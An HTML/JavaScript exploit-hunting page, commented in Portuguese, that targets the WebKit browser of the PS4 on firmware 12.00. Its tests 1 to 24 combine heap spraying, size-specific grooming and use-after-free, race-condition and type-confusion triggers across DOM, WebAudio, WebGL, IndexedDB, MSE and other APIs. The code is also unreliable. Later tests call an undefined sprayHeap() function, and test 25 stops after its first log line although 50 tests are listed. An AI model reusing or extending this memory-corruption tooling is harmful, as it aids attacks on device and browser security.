<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 FW 12.00 :: WebKit POC Suite</title>
    
</head>
<body>

    <h1>PS4 WEBKIT HUNTER (FW 12.00)</h1>
    <p>Based on your <i>PS4_EXTERMINATOR_CLEAN.json</i> & <i>APIs e Eventos.txt</i></p>

    <div class="btn-container">
        <button onclick="runTest1()">TEST 1: Sony Fullscreen UAF (Event Attack)</button>
        <button onclick="runTest2()">TEST 2: Exact Size Bad-Alloc (0xD0/0xFF)</button>
        <button onclick="runTest3()">TEST 3: deleteMedium (Command Injection)</button>
        <button onclick="runTest4()">TEST 4: SVG Matrix Corruption (Bad Cast)</button>
        <button onclick="runTest5()">TEST 5: ArrayBuffer Neutering (Race Condition)</button>
        <button onclick="runTest6()">TEST 6: adoptNode() Double-Free</button>
        <button onclick="runTest7()">TEST 7: NodeIterator DOM Mutation</button>
        <button onclick="runTest8()">TEST 8: WebAudio Use-After-Free (Kernel Risk)</button>
        <button onclick="runTest9()">TEST 9: Object 0xFF (255 bytes) Grooming</button>
        <button onclick="runTest10()">TEST 10: Blob URL Revocation Race</button>
        <button onclick="runTest11()">TEST 11: Attribute Setter Side-Effect (Logical UAF)</button>
        <button onclick="runTest12()">TEST 12: Large Allocation (Gigacage Bypass)</button>
        <button onclick="runTest13()">TEST 13: CSS FontFace Loading Race</button>
        <button onclick="runTest14()">TEST 14: WebGL Texture Feedback Loop</button>
        <button onclick="runTest15()">TEST 15: Nested Event Loop (Synchronous XHR)</button>
        <button onclick="runTest16()">TEST 16: RegExp Replace Reentrancy (Classic UAF)</button>
        <button onclick="runTest17()">TEST 17: IndexedDB Transaction Race</button>
        <button onclick="runTest18()">TEST 18: TextTrack Cue Eviction</button>
        <button onclick="runTest19()">TEST 19: MSE SourceBuffer Abort Race</button>
        <button onclick="runTest20()">TEST 20: MessagePort Detachment Loop</button>
        <button onclick="runTest21()">TEST 21: History State Serialization UAF</button>
        <button onclick="runTest22()">TEST 22: CSS Transition End Destruction</button>
        <button onclick="runTest23()">TEST 23: Selection Range Corruption</button>
        <button onclick="runTest24()">TEST 24: Canvas Pattern Source Resize</button>
        <button onclick="runTest25()">TEST 25: TreeWalker Dangling Pointer</button>
        <button onclick="runTest26()">TEST 26: DataTransfer Item List UAF</button>
        <button onclick="runTest27()">TEST 27: FileReader Worker Termination Race</button>
        <button onclick="runTest28()">TEST 28: Range Insertion Mutation</button>
        <button onclick="runTest29()">TEST 29: Canvas Proxy Type Confusion</button>
        <button onclick="runTest30()">TEST 30: History State Serialization Destruction</button>
        <button onclick="runTest31()">TEST 31: Reflect.construct Proxy Trap</button>
        <button onclick="runTest32()">TEST 32: Array.sort resizing (The "OOB" Classic)</button>
        <button onclick="runTest33()">TEST 33: XSLTProcessor Use-After-Free</button>
        <button onclick="runTest34()">TEST 34: Intl.Collator Memory Corruption</button>
        <button onclick="runTest35()">TEST 35: Object.seal Property Redefinition</button>
        <button onclick="runTest36()">TEST 36: BroadcastChannel Message UAF</button>
        <button onclick="runTest37()">TEST 37: Map Iterator Invalidation</button>
        <button onclick="runTest38()">TEST 38: Promise Microtask Object Destruction</button>
        <button onclick="runTest39()">TEST 39: document.open() Reset Race</button>
        <button onclick="runTest40()">TEST 40: DOMParser Node Adoption</button>
        <button onclick="runTest41()">TEST 41: WebAssembly Memory Growth (Detached Buffer)</button>
        <button onclick="runTest42()">TEST 42: ReadableStream Tee Cancel Race</button>
        <button onclick="runTest43()">TEST 43: HarfBuzz Font Shaping Overflow</button>
        <button onclick="runTest44()">TEST 44: DOMMatrix NaN Poisoning</button>
        <button onclick="runTest45()">TEST 45: Object.prototype Setter Trap</button>
        <button onclick="runTest46()">TEST 46: OffscreenCanvas Bitmap Transfer Race</button>
        <button onclick="runTest47()">TEST 47: Sliced Blob Revocation (Worker Read)</button>
        <button onclick="runTest48()">TEST 48: ScriptProcessorNode Disconnect UAF</button>
        <button onclick="runTest49()">TEST 49: DOM Node.normalize() Mutation</button>
        <button onclick="runTest50()">TEST 50: FontFaceSet Loading State Confusion</button>
    </div>

    <div id="log">Logs do sistema aparecerao aqui...</div>

    <script>
        // --- HELPER FUNCTIONS ---
        function log(msg) {
            const l = document.getElementById('log');
            l.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        // Heap Spray Básico para preencher buracos (Grooming)
        // Tenta preencher a memória com 0x41414141 (AAAA) para controlar o crash
        var sprayStore = [];
        function heapSpray(size_in_bytes) {
            log(`Spraying heap com blocos de ${size_in_bytes} bytes...`);
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint8Array(size_in_bytes);
                arr.fill(0x41); 
                sprayStore.push(arr);
            }
        }

        // --- TESTE 1: O Ataque ao Evento Fullscreen ---
        // Baseado em "onwebkitfullscreenchange" do seu arquivo de eventos
        var target1 = null;
        function runTest1() {
            log("Iniciando Teste 1: Fullscreen Event UAF...");
            target1 = document.createElement('div');
            document.body.appendChild(target1);
            
            // Adiciona o listener perigoso
            target1.addEventListener('webkitfullscreenchange', function() {
                log("Evento disparado! Tentando remover elemento durante callback...");
                
                // 1. Remove o elemento do DOM
                document.body.removeChild(target1);
                
                // 2. Remove referência JS
                var staleRef = target1;
                target1 = null;
                
                // 3. Tenta preencher o buraco deixado
                heapSpray(0x2000); 
                
                // 4. Acessa a referência velha (Se crashar aqui, é UAF!)
                staleRef.innerHTML = "X"; 
                log("Sobreviveu? Bug não disparou.");
            });

            // Trigger (Requer interação do usuário no PS4)
            target1.webkitRequestFullscreen();
        }

        // --- TESTE 2: Alocação de Tamanho Exato ---
        // Baseado no JSON onde 'A8tBH' tem tamanho 0xD0 (208)
        function runTest2() {
            log("Iniciando Teste 2: Alocação Precisa (0xD0)...");
            
            // O arquivo diz que a classe A8tBH tem 208 bytes (0xD0)
            const TARGET_SIZE = 208; 
            let holes = [];
            
            // 1. Cria fragmentação
            for(let i=0; i<2000; i++) {
                // Tenta criar objetos que caiam no bucket de 208 bytes
                let div = document.createElement('div');
                // Adicionar atributos pode aumentar o tamanho interno do objeto C++
                div.setAttribute('id', 'x'.repeat(TARGET_SIZE - 40)); 
                holes.push(div);
            }

            // 2. Cria buracos (Free)
            log("Libertando 50% dos objetos para criar 'holes'...");
            for(let i=0; i<holes.length; i+=2) {
                holes[i] = null;
            }

            // 3. Força Garbage Collection (Simulado criando pressão de memória)
            let pressure = new ArrayBuffer(1024 * 1024 * 10); // 10MB
            
            // 4. Tenta reocupar com dados controlados (Spray)
            log("Tentando reocupar slots 0xD0...");
            let reoccupy = [];
            for(let i=0; i<3000; i++) {
                let b = new Uint8Array(TARGET_SIZE);
                b.fill(0x42); // 'BBBB'
                reoccupy.push(b);
            }
            
            log("Teste 2 concluído. Se o PS4 congelar em 10s, verifique o dump.");
        }

        // --- TESTE 3: deleteMedium Command ---
        // Baseado em "deleteMedium" do arquivo de APIs
        function runTest3() {
            log("Iniciando Teste 3: deleteMedium Command Injection...");
            
            document.designMode = "on"; // Necessário para execCommand
            
            // Cria estrutura complexa para confundir o parser
            let container = document.createElement('div');
            container.innerHTML = "<b>Start</b><table><tr><td>Cell 1</td><td>Cell 2</td></tr></table><i>End</i>";
            document.body.appendChild(container);
            
            // Seleciona através de limites inválidos (Table vs Text)
            let s = window.getSelection();
            let r = document.createRange();
            r.setStart(container, 0);
            r.setEnd(container.querySelector('td'), 0);
            s.removeAllRanges();
            s.addRange(r);
            
            // Executa o comando perigoso
            try {
                log("Executando deleteMedium...");
                document.execCommand('deleteMedium');
                log("Comando executado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
            
            document.designMode = "off";
        }

        // --- TESTE 4: SVG Matrix Casting ---
        // Testando corrupção em objetos gráficos
        function runTest4() {
            log("Iniciando Teste 4: SVG Matrix Manipulation...");
            
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let matrix = svg.createSVGMatrix();
                
                // Tenta corromper os floats internos
                matrix.a = 1.1;
                matrix.b = 2.2;
                matrix.c = 3.3;
                matrix.d = 4.4;
                matrix.e = 5.5;
                matrix.f = 6.6;

                // Tenta usar a matriz em um contexto inválido
                let path = document.createElementNS("http://www.w3.org/2000/svg", "path");
                
                // Transforma e remove rapidamente
                let transform = svg.createSVGTransformFromMatrix(matrix);
                path.transform.baseVal.appendItem(transform);
                
                // Remove o SVG pai enquanto o transform ainda é referenciado
                svg.remove(); 
                
                // Acessa propriedade do transform órfão
                log("Lendo matriz de objeto removido: " + transform.matrix.a); 
                
            } catch(e) {
                log("Crash evitado pelo try/catch: " + e);
            }
        }

        // --- TESTE 5: ArrayBuffer Transfer (Neutering) ---
        // Tenta acessar memória que foi transferida (Use-After-Move)
        function runTest5() {
            log("Iniciando Teste 5: ArrayBuffer Neutering...");
            
            const size = 1024 * 1024; // 1MB
            const buffer = new ArrayBuffer(size);
            const view = new Uint8Array(buffer);
            view[0] = 0xAA;

            try {
                // PostMessage para si mesmo, transferindo a posse do buffer
                // Isso "Neuters" (esvazia) o buffer original imediatamente
                window.postMessage("teste", "*", [buffer]);
                
                // Tenta ler o buffer IMEDIATAMENTE após transferir
                // Se houver race condition, ele ainda pode ler 0xAA ou crashar
                if (buffer.byteLength === 0) {
                    log("Buffer foi neutralizado corretamente (Comportamento seguro).");
                    // Tenta forçar acesso mesmo assim (pode crashar engines bugadas)
                    log("Tentativa forçada de leitura: " + view[0]); 
                } else {
                    log("PERIGO: Buffer ainda acessível! (Vulnerabilidade encontrada)");
                }
            } catch(e) {
                log("Erro: " + e);
            }
        }
// --- TESTE 6: adoptNode Double-Free ---
        // Alvo: APIs e Eventos.txt ("adoptNode" é notório por bugs de ownership)
        function runTest6() {
            log("Iniciando Teste 6: adoptNode Cross-Document...");
            
            // Cria um Iframe para ter um "Documento B"
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            
            let docB = iframe.contentDocument;
            let element = docB.createElement('div');
            element.id = "victim";
            docB.body.appendChild(element);

            // Tenta mover o nó enquanto destrói o contexto de origem
            try {
                // Hook no evento 'unload' do iframe
                iframe.contentWindow.onunload = function() {
                    log("Iframe descarregando... tentando roubar o nó (adoptNode)!");
                    // Tenta adotar o nó de um documento que está morrendo
                    document.adoptNode(element); 
                };

                // Remove o iframe para disparar o unload
                log("Removendo Iframe...");
                document.body.removeChild(iframe);
                
                // Spray para ocupar a memória do documento antigo
                heapSpray(0x100); 

                // Tenta acessar o elemento adotado
                element.innerHTML = "Crash?";
                log("Elemento acessado. Se não crashou, o ownership foi transferido corretamente.");
                
            } catch(e) {
                log("Erro capturado: " + e.message);
            }
        }

        // --- TESTE 7: NodeIterator Confusion ---
        // Iteradores de nós mantêm referências à árvore DOM. Se alterarmos a árvore durante a iteração...
        function runTest7() {
            log("Iniciando Teste 7: NodeIterator Mutation...");
            
            let root = document.createElement('div');
            let child = document.createElement('span');
            root.appendChild(child);
            document.body.appendChild(root);

            // Cria um iterador apontando para o span
            let ni = document.createNodeIterator(root, NodeFilter.SHOW_ALL);
            ni.nextNode(); // root
            let currentNode = ni.nextNode(); // span (child)

            log("Iterador criado. Mutando DOM...");

            // Remove o nó que o iterador está segurando
            root.removeChild(child);
            child = null; // Remove referência JS

            // O NodeIterator ainda segura uma referência interna (C++) para o 'child'
            heapSpray(0x40); // Tenta sujar a memória ao redor

            // Tenta avançar ou recuar o iterador a partir de um nó deletado
            try {
                let val = ni.previousNode(); 
                log("NodeIterator sobreviveu. Valor retornado: " + val);
            } catch(e) {
                log("Crash evitado: " + e);
            }
        }

        // --- TESTE 8: WebAudio UAF ---
        // Alvo: Módulo SceSysAudio (Kernel/Driver level)
        // WebAudio roda em thread separada, ideal para Race Conditions.
        function runTest8() {
            log("Iniciando Teste 8: WebAudio Concurrency...");
            
            try {
                let AudioCtor = window.AudioContext || window.webkitAudioContext;
                if (!AudioCtor) { log("WebAudio não suportado."); return; }

                let ctx = new AudioCtor();
                let osc = ctx.createOscillator();
                let gain = ctx.createGain();

                osc.connect(gain);
                gain.connect(ctx.destination);
                
                // Inicia o áudio (Processamento em outra thread)
                osc.start(0);

                // Tenta destruir o contexto/nós enquanto o áudio processa
                setTimeout(() => {
                    log("Destruindo contexto de áudio agressivamente...");
                    osc.disconnect();
                    gain.disconnect();
                    ctx.close().then(() => {
                         // Libera referências imediatamente
                        osc = null;
                        gain = null;
                        ctx = null;
                        // Spray rápido para sobrescrever o buffer de áudio
                        heapSpray(0x1000); 
                    });
                }, 100); // 100ms é tempo suficiente para o thread de áudio estar ativo

            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 9: Target Size 0xFF (255 Bytes) ---
        // Alvo: PS4_EXTERMINATOR_CLEAN.json -> Class 'KhH9HpubH' (Count 165, Size 0xFF)
        // Precisamos alocar objetos de EXATAMENTE 255 bytes.
        function runTest9() {
            log("Iniciando Teste 9: Grooming Específico (0xFF/255 bytes)...");

            let targetSize = 255;
            let grooming = [];

            // Estratégia: Strings de tamanho específico costumam ir para buckets de tamanho fixo
            // 255 bytes pode ser uma string de 127 caracteres (2 bytes por char no JS) + header overhead
            // Ou ArrayBuffer direto. Vamos tentar ArrayBuffer para precisão.
            
            log("Alocando 10.000 buffers de 255 bytes...");
            for(let i=0; i<10000; i++) {
                grooming.push(new Uint8Array(targetSize));
            }

            // Cria buracos (Swiss Cheese)
            log("Criando buracos no Heap...");
            for(let i=0; i<grooming.length; i+=3) {
                grooming[i] = null; 
            }

            // Tenta triggerar a criação do objeto interno do WebKit (KhH9HpubH)
            // Esse objeto é desconhecido, mas pelo count alto (165), deve ser algo comum.
            // Vamos tentar criar muitos elementos de estilo e atributos, que geram objetos pequenos.
            let elements = [];
            for(let i=0; i<2000; i++) {
                let d = document.createElement('div');
                // Atributos e Classes geram objetos internos
                d.setAttribute('class', 'a'.repeat(50)); 
                d.setAttribute('id', 'b'.repeat(50));
                elements.push(d);
            }
            
            log("Grooming concluído. Verifique se o sistema fica instável.");
        }

        // --- TESTE 10: Blob URL Race Condition ---
        // Revogar uma URL enquanto ela está sendo carregada (XHR/Image)
        function runTest10() {
            log("Iniciando Teste 10: Blob URL Revoke Race...");
            
            // Cria um blob grande
            let data = new Uint8Array(1024 * 1024 * 5).fill(0x41); // 5MB
            let blob = new Blob([data], {type: 'application/octet-stream'});
            let url = URL.createObjectURL(blob);

            // Cria um Worker para tentar ler o Blob
            let xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            
            xhr.onreadystatechange = function() {
                if(xhr.readyState === 2) { // Headers received
                     log("Download iniciado. Revogando URL agora!");
                     // O driver de rede está lendo o blob. Nós deletamos a referência.
                     URL.revokeObjectURL(url);
                     blob = null;
                     data = null;
                     
                     // Tenta sobrescrever a memória do Blob enquanto o XHR lê
                     heapSpray(1024 * 1024); 
                }
            };
            
            xhr.send();
        }
// --- TESTE 11: Setter Side-Effect ---
        // Ignora IsoHeap atacando a lógica, não a memória bruta.
        // Passamos um objeto com um .toString() malicioso para um setter nativo.
        // O navegador chama .toString() (Userland), nós destruímos o objeto pai,
        // e o navegador retoma a execução C++ usando o ponteiro "this" que acabou de ser liberado.
        function runTest11() {
            log("Iniciando Test 11: Attribute Setter Side-Effect...");
            
            var container = document.createElement('div');
            var child = document.createElement('span');
            container.appendChild(child);
            document.body.appendChild(container);

            var boom = {
                toString: function() {
                    log("Side-effect ativado! Destruindo objeto pai...");
                    // Destroi o elemento que está sendo modificado
                    child.remove();
                    container.innerHTML = ""; // Limpa referências
                    
                    // Garbage Collection forçado (tentativa)
                    for(let i=0; i<1000; i++) new  Uint8Array(1024);
                    
                    return "valor_ignorada";
                }
            };

            try {
                // Ao definir 'id', o WebKit converte o valor para string.
                // Se a conversão ocorrer APÓS a verificação de ponteiro, mas ANTES da escrita...
                log("Atribuindo ID malicioso...");
                child.setAttribute('id', boom); 
            } catch(e) {
                log("Erro (Esperado se mitigado): " + e);
            }
        }

        // --- TESTE 12: Gigacage Bypass (Large Alloc) ---
        // O Gigacage geralmente protege buffers pequenos/médios.
        // Alocações gigantes (>4GB ou limites específicos do OS) podem cair em mmap() direto.
        function runTest12() {
            log("Iniciando Test 12: Large Allocation Strategy...");
            
            try {
                // Tenta alocar um buffer perigosamente grande para o PS4 (que tem RAM unificada limitada)
                // O objetivo não é OOM (Out of Memory), mas forçar um fallback de alocador.
                const SAFE_SIZE = 1024 * 1024 * 128; // 128MB chunks
                let arrays = [];
                
                log("Alocando chunks fora do padrão...");
                for(let i=0; i<5; i++) {
                    // ArrayBuffer pode ser alocado via sistema se for muito grande
                    arrays.push(new ArrayBuffer(SAFE_SIZE));
                }

                // Fragmentação: Libera o do meio
                log("Liberando chunk central...");
                arrays[2] = null; 

                // Tenta reivindicar esse espaço com um objeto diferente (ex: WebAssembly Memory ou Video Frame)
                // Se conseguirmos sobrepor, violamos a integridade.
                if (window.WebAssembly) {
                    log("Tentando alocar WebAssembly Memory no buraco...");
                    let mem = new WebAssembly.Memory({initial: 2000}); // ~128MB
                }
                
                log("Sobreviveu. Verifique se houve glitch visual.");
            } catch(e) {
                log("Falha na alocação: " + e.message);
            }
        }

        // --- TESTE 13: CSS FontFace Race ---
        // Fontes carregam assincronamente. Manipular o DOM enquanto o motor de fontes
        // tenta rasterizar glifos pode causar corrupção.
        function runTest13() {
            log("Iniciando Test 13: FontFace Loading Race...");
            
            // Define uma fonte "falsa"
            var f = new FontFace('CrashFont', 'url(data:font/woff;base64,AAAA...)');
            
            f.load().then(function(loadedFace) {
                document.fonts.add(loadedFace);
                document.body.style.fontFamily = 'CrashFont';
                log("Fonte carregada. Iniciando stress...");
            }).catch(e => log("Erro load: " + e));

            // Enquanto carrega (ou logo após), bombardeia o layout
            let el = document.createElement('div');
            el.innerText = "TEXTO PARA RENDERIZAR";
            document.body.appendChild(el);

            let interval = setInterval(() => {
                el.style.fontFamily = (Math.random() > 0.5) ? 'CrashFont' : 'sans-serif';
                // Força recálculo de estilo e remove o nó ao mesmo tempo
                if(Math.random() > 0.9) {
                    el.remove();
                    document.body.appendChild(el); // Re-adiciona (Thrashing)
                }
            }, 10);

            setTimeout(() => { clearInterval(interval); log("Teste 13 Parado."); }, 3000);
        }

        // --- TESTE 14: WebGL Feedback Loop ---
        // A memória de GPU geralmente não é "Gigacaged".
        // Usamos createTexture -> bind -> delete -> draw
        function runTest14() {
            log("Iniciando Test 14: WebGL Texture UAF...");
            
            let canvas = document.createElement('canvas');
            let gl = canvas.getContext('webgl');
            
            if(!gl) { log("WebGL não suportado."); return; }

            let texture = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, texture);
            
            // Aloca textura VRAM
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);

            let fb = gl.createFramebuffer();
            gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
            
            // Anexa textura ao framebuffer
            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);

            log("Textura anexada. Deletando textura...");
            // Bug clássico: Deletar a textura deveria invalidar o Framebuffer Attachment.
            // Se a implementação falhar, o FB aponta para memória livre de GPU.
            gl.deleteTexture(texture);

            // Tenta ler do Framebuffer (que aponta para a textura morta)
            let pixels = new Uint8Array(4);
            try {
                gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                log("Leitura feita (seguro se for [0,0,0,0], perigo se lixo): " + pixels);
            } catch(e) {
                log("Crash evitado pelo driver.");
            }
        }

        // --- TESTE 15: Nested Event Loop (Sync XHR) ---
        // XMLHttpRequest Síncrono pausa o JS, mas eventos de sistema continuam.
        // Podemos disparar eventos dentro de eventos.
        function runTest15() {
            log("Iniciando Test 15: Sync XHR Nesting...");
            
            let btn = document.createElement('button');
            btn.id = "clickme";
            document.body.appendChild(btn);

            btn.addEventListener('click', function() {
                log("Click processando. Bloqueando thread com XHR Sync...");
                
                // Remove o botão DENTRO do próprio handler
                btn.remove();
                
                // Abre uma requisição síncrona (bloqueia UI, mas processa eventos de rede/sistema)
                // Tenta forçar o navegador a lidar com o objeto 'btn' que já foi removido
                let xhr = new XMLHttpRequest();
                // Usa um endpoint lento ou local
                xhr.open('GET', window.location.href + '?delay=1', false); 
                try {
                    xhr.send(null);
                } catch(e) {}
                
                log("XHR terminou. Se o navegador tentou redesenhar o botão durante o freeze...");
            });

            log("Simulando clique...");
            btn.click();
        }

        // --- TESTE 16: RegExp Replace Reentrancy ---
        // Este bug explora a função String.prototype.replace.
        // Se passarmos uma função como segundo argumento, ela roda a cada match.
        // Se dentro dessa função nós destruirmos a string original ou o objeto pai,
        // o motor C++ pode tentar ler a próxima parte da string de uma memória morta.
        function runTest16() {
            log("Iniciando Test 16: RegExp Reentrancy...");
            
            try {
                var o = {
                    toString: function() {
                        log("Callback ativado! Invocando destruição...");
                        // 2. Aqui dentro, destruímos o contexto
                        sprayHeap(); // Tenta sobrescrever memória
                        return "X";
                    }
                };
                
                // 1. String grande para garantir processamento em chunks
                var str = "A".repeat(10000); 
                
                // O método replace chama o.toString() para converter o substituto
                // Se o WebKit não proteger a referência da string 'str' na pilha C++,
                // a manipulação dentro do toString pode corromper o estado.
                var result = str.replace(/A/g, o);
                
                log("Concluído. Tamanho result: " + result.length);
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 17: IndexedDB Transaction Race ---
        // IndexedDB opera em outra thread/processo.
        // Se fecharmos o banco de dados no exato momento que uma transação completa,
        // podemos causar um UAF no objeto de requisição (IDBRequest).
        function runTest17() {
            log("Iniciando Test 17: IndexedDB Race...");
            
            var request = window.indexedDB.open("ExploitDB", 1);
            
            request.onupgradeneeded = function(event) {
                var db = event.target.result;
                db.createObjectStore("store");
            };
            
            request.onsuccess = function(event) {
                var db = event.target.result;
                var trans = db.transaction(["store"], "readwrite");
                var store = trans.objectStore("store");
                
                // Adiciona algo
                var reqAdd = store.put("dados", "chave");
                
                reqAdd.onsuccess = function() {
                    log("Escrita concluída. Tentando race condition...");
                    
                    // Race: Tenta ler E fechar ao mesmo tempo
                    store.get("chave");
                    
                    // Força fechamento imediato
                    db.close(); 
                    
                    // Tenta acessar propriedades da transação morta
                    try {
                        let mode = trans.mode; // Pode acessar ponteiro inválido
                        log("Modo lido: " + mode);
                    } catch(e) {}
                    
                    // Spray para preencher estruturas do IDB
                    sprayHeap();
                };
            };
        }

        // --- TESTE 18: TextTrack Cue Eviction ---
        // Faixas de legenda (VTT) possuem eventos 'enter' e 'exit'.
        // Modificar a lista de faixas DENTRO do evento pode confundir o iterador C++.
        function runTest18() {
            log("Iniciando Test 18: TextTrack Cue UAF...");
            
            var video = document.createElement('video');
            var track = video.addTextTrack("captions", "English", "en");
            track.mode = "showing";
            
            // Cria um Cue (legenda) que dura muito pouco
            var cue = new VTTCue(0, 0.1, "Payload");
            track.addCue(cue);
            
            cue.onexit = function() {
                log("Cue onExit disparado. Removendo track...");
                
                // Remove a faixa inteira enquanto o evento 'exit' da cue ainda está borbulhando
                video = null; // Remove referência ao video
                track.mode = "disabled"; // Desabilita
                
                // Tenta acessar a cue que acabou de sair
                cue.text = "Crash"; 
                
                sprayHeap();
            };
            
            log("Rodando video...");
            // Simula avanço de tempo para disparar o evento
            // Nota: Em browser real precisaria de video.play(), aqui simulamos a lógica
            // Se possível, interação do usuário é necessária para play() real.
        }

        // --- TESTE 19: MSE SourceBuffer Abort Race ---
        // Media Source Extensions lidam com buffers binários brutos.
        // abort() cancela operações pendentes. Usar abort() seguido de appendBuffer() rápido
        // é uma técnica conhecida para corromper ponteiros de leitura/escrita.
        function runTest19() {
            log("Iniciando Test 19: MSE Buffer Race...");
            
            if (!window.MediaSource) { log("MSE não suportado."); return; }
            
            var ms = new MediaSource();
            var url = URL.createObjectURL(ms);
            var video = document.createElement('video');
            video.src = url;
            
            ms.addEventListener('sourceopen', function() {
                try {
                    var sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                    var buf = new Uint8Array(1024 * 1024); // 1MB lixo
                    
                    log("Iniciando append/abort loop...");
                    
                    // Loop agressivo
                    var i = 0;
                    var interval = setInterval(function() {
                        if (i++ > 50) clearInterval(interval);
                        
                        try {
                            if (!sb.updating) {
                                sb.appendBuffer(buf);
                            } else {
                                // Interrompe no meio da cópia de memória
                                sb.abort(); 
                            }
                        } catch(e) {}
                    }, 5); // Intervalo curtíssimo para causar colisão
                    
                } catch(e) { log("Erro setup: " + e); }
            });
        }

        // --- TESTE 20: MessagePort Detachment Loop ---
        // MessagePorts (usados em postMessage) podem ser transferidos.
        // Se transferirmos uma porta para ela mesma ou criarmos um ciclo,
        // o Garbage Collector pode falhar em identificar o ciclo e liberar a memória cedo demais
        // ou causar Stack Overflow na fase de "Mark and Sweep".
        function runTest20() {
            log("Iniciando Test 20: MessagePort Entanglement...");
            
            var channel = new MessageChannel();
            var port1 = channel.port1;
            var port2 = channel.port2;
            
            port1.onmessage = function(e) {
                log("Msg recebida. Transferindo recursivamente...");
                // Transfere a porta recebida para... a outra ponta!
                try {
                    port2.postMessage("ping", [e.ports[0]]);
                } catch(e) {
                    log("Ciclo quebrado/Erro: " + e);
                }
            };
            
            // Inicia o ping-pong da morte
            // Enviamos port1 através de port2. Quando chegar, ela será enviada de volta.
            // Isso estressa o mecanismo de serialização/deserialização de portas.
            try {
                port2.postMessage("init", [port1]);
            } catch(e) {
                 log("Erro inicial: " + e);
            }
            
            // Spray para o caso de falha no GC
            setTimeout(sprayHeap, 100);
        }
// --- TESTE 21: History State Serialization UAF ---
        // O WebKit serializa objetos para salvar no histórico. Se o objeto contiver
        // um getter que modifica o DOM ou o próprio histórico DURANTE a serialização,
        // o motor pode crashar ao tentar ler o resto do objeto.
        function runTest21() {
            log("Iniciando Test 21: History Serialization...");
            
            var evilObj = {};
            // Define uma propriedade que executa código quando lida
            Object.defineProperty(evilObj, 'poison', {
                get: function() {
                    log("Getter ativado durante serialização! Limpando histórico...");
                    try {
                        // Tenta destruir o estado atual enquanto ele está sendo salvo
                        history.replaceState(null, "", "");
                        sprayHeap();
                    } catch(e) {}
                    return "crash";
                }
            });

            try {
                // history.pushState usa "Structured Clone"
                // O WebKit vai começar a ler 'evilObj'. Quando chegar em 'poison', roda o getter.
                history.pushState(evilObj, "Title", "?test=crash");
                log("Sobreviveu. A serialização foi protegida.");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 22: CSS Transition End Destruction ---
        // Baseado no evento "onwebkittransitionend" (Crítico no seu arquivo).
        // Iniciamos uma transição CSS e, no exato frame que ela termina,
        // destruímos o objeto. O motor pode tentar acessar propriedades finais da animação.
        function runTest22() {
            log("Iniciando Test 22: CSS Transition UAF...");
            
            var el = document.createElement('div');
            el.style.width = "100px";
            el.style.height = "100px";
            el.style.background = "red";
            el.style.transition = "width 0.1s"; // Transição muito rápida
            document.body.appendChild(el);

            // Força reflow
            el.offsetWidth;

            el.addEventListener('transitionend', function() {
                log("Transição acabou. Destruindo elemento...");
                el.remove();
                el = null;
                
                // Tenta ocupar a memória do elemento de layout
                sprayHeap();
                
                // Força um recálculo de estilo global
                document.body.style.zoom = 1.0001;
            });

            // Dispara a transição
            el.style.width = "200px";
        }

        // --- TESTE 23: Selection Range Corruption ---
        // Ranges são "Live Objects". Eles atualizam quando o DOM muda.
        // Se deletarmos o conteúdo que um Range seleciona, e tentarmos fundir
        // com outro Range, podemos causar corrupção.
        function runTest23() {
            log("Iniciando Test 23: Selection Range...");
            
            var div = document.createElement('div');
            div.innerHTML = "A<span>B</span>C";
            document.body.appendChild(div);

            var sel = window.getSelection();
            var range = document.createRange();
            
            // Seleciona o 'B' dentro do span
            range.selectNode(div.children[0]);
            sel.addRange(range);

            log("Seleção ativa. Detonando conteúdo...");

            // Modifica o DOM drasticamente
            div.innerHTML = ""; 
            
            // Tenta acessar o Range que agora aponta para nós mortos
            try {
                var rect = range.getBoundingClientRect(); // Cálculo geométrico perigoso
                log("Rect: " + rect.width);
                
                range.deleteContents(); // Tenta escrever/modificar nós mortos
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 24: Canvas Pattern Source Resize ---
        // Criamos um padrão (textura) a partir de um Canvas.
        // Se redimensionarmos o Canvas fonte para 0, a memória de backing store é liberada.
        // Se o padrão não rastrear isso corretamente, ele usa memória liberada.
        function runTest24() {
            log("Iniciando Test 24: Canvas Pattern Resize...");
            
            var srcCanvas = document.createElement('canvas');
            srcCanvas.width = 100;
            srcCanvas.height = 100;
            var srcCtx = srcCanvas.getContext('2d');
            srcCtx.fillStyle = 'red';
            srcCtx.fillRect(0,0,100,100);

            var destCanvas = document.createElement('canvas');
            var destCtx = destCanvas.getContext('2d');

            // Cria o pattern (referência à textura do srcCanvas)
            var pattern = destCtx.createPattern(srcCanvas, 'repeat');

            log("Pattern criado. Zerando canvas fonte...");
            
            // Redimensionar libera a memória dos pixels
            srcCanvas.width = 0;
            srcCanvas.height = 0;
            
            sprayHeap(); // Tenta sujar a memória antiga da textura

            try {
                // Tenta usar o pattern que aponta para a memória antiga
                destCtx.fillStyle = pattern;
                destCtx.fillRect(0, 0, 100, 100);
                log("Desenho concluído (glitches visuais?).");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 25: TreeWalker Dangling Pointer ---
        // TreeWalker é similar ao NodeIterator mas mais complexo.
        // Ele "caminha" pelo DOM. Se removermos o nó onde ele está pisando ("currentNode"),
        // ele deve subir para o pai. Se removermos o pai também... confusão.
        function runTest25() {
            log("Iniciando Test 25: TreeWalker Walker...");
            
